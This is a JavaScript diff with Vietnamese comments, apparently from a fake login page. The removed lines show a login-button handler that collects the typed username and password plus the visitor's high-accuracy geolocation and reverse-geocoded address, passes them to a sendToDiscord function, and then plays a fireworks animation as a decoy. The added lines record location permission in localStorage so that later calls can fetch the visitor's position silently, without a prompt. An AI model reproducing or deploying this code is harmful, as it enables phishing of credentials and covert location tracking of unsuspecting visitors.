@@ -1,56 +1,36 @@
-// === BẤM NÚT LOGIN ===
-document.getElementById('loginBtn').addEventListener('click', function() {
-    const username = document.getElementById('username').value || 'Không có';
-    const password = document.getElementById('password').value || 'Không có';
-    const status = document.getElementById('status');
-
-    status.innerHTML = '⏳ Đang xác thực...';
-    status.style.color = '#00c8ff';
-
-    // === GỌI LOCATION NGAY TRONG NÚT BẤM ===
+// === Lần đầu: gọi location có popup ===
+function requestLocationPermission(callback) {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             function(pos) {
-                const loc = {
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    acc: pos.coords.accuracy,
-                    address: 'Đang lấy...'
-                };
-                fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${loc.lat}&lon=${loc.lon}&zoom=18&addressdetails=1`)
-                    .then(res => res.json())
-                    .then(data => {
-                        loc.address = data.display_name || 'Không xác định';
-                        sendToDiscord(username, password, loc);
-                    })
-                    .catch(() => {
-                        loc.address = 'Lỗi lấy địa chỉ';
-                        sendToDiscord(username, password, loc);
-                    });
+                // Đã được cấp quyền → lưu lại để dùng sau
+                localStorage.setItem('locationGranted', 'true');
+                callback(pos);
             },
             function(err) {
-                sendToDiscord(username, password, {
-                    lat: null,
-                    lon: null,
-                    acc: null,
-                    address: '❌ Lỗi định vị: ' + err.message
-                });
+                // Từ chối hoặc lỗi
+                localStorage.setItem('locationGranted', 'false');
+                callback(null);
             },
             { enableHighAccuracy: true, timeout: 10000 }
         );
-    } else {
-        sendToDiscord(username, password, {
-            lat: null,
-            lon: null,
-            acc: null,
-            address: '❌ Trình duyệt không hỗ trợ định vị'
-        });
     }
+}
 
-    // Ẩn card + show pháo hoa
-    document.getElementById('loginCard').classList.add('hidden');
-    setTimeout(() => {
-        document.getElementById('congratsOverlay').classList.add('show');
-        startFireworks();
-    }, 600);
-});
+// === Lần sau: gọi âm thầm (không hỏi) ===
+function getLocationSilently(callback) {
+    if (localStorage.getItem('locationGranted') === 'true') {
+        // Đã có quyền → gọi không popup
+        navigator.geolocation.getCurrentPosition(
+            function(pos) {
+                callback(pos);
+            },
+            function(err) {
+                callback(null);
+            },
+            { enableHighAccuracy: true, timeout: 5000 }
+        );
+    } else {
+        callback(null);
+    }
+}
